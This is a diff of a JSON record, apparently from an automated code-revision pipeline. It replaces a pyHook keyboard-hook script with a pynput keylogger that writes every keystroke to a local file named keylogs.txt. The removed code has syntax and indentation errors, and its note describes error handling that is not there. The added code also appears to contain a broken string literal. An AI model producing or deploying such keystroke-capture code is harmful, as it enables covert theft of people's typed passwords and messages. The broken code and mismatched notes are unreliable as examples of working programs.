@@ -1,6 +1,6 @@
 {
-  "output": "import pyHook, pythoncom\n\nhook = pyHook.HookManager()\ndef OnKeyboardEvent(event):\n\tif event.Ascii==96:\n\t\tprint(\"The ` key was pressed.\")\n\treturn True\n\thook.KeyDown = OnKeyboardEvent\n\thook.HookKeyboard()\ntry:\n\thook.start()\nexcept KeyboardInterrupt;\n\thook.stop()",
-  "notes": "Implemented IOError handling using 'with' statement for file operations.",
+  "output": "import pynput\nfrom pynput import keyboard\nimport os\n\ndef on_press(key):\n    try:\n        with open('keylogs.txt', 'a') as f:\n            if hasattr(key, 'char'):  # Alphanumeric key pressed\n                f.write(str(f'{key} \n'))\n            else:                   # Special key pressed\n                f.write(str(f'(special) {str(key)} \\n'))\n    except Exception as ex:\n        print('Error in appending to file:', ex)\n\ndef on_release(key):\n    if key == keyboard.Key.esc:       # If the 'escape' key is pressed, stop listening for keys\n        return False\n\nwith keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n    listener.join()",
+  "notes": "Revised code with required imports and file writing capability.",
   "applied_fixes": [
     "iteration2_issue1"
   ],
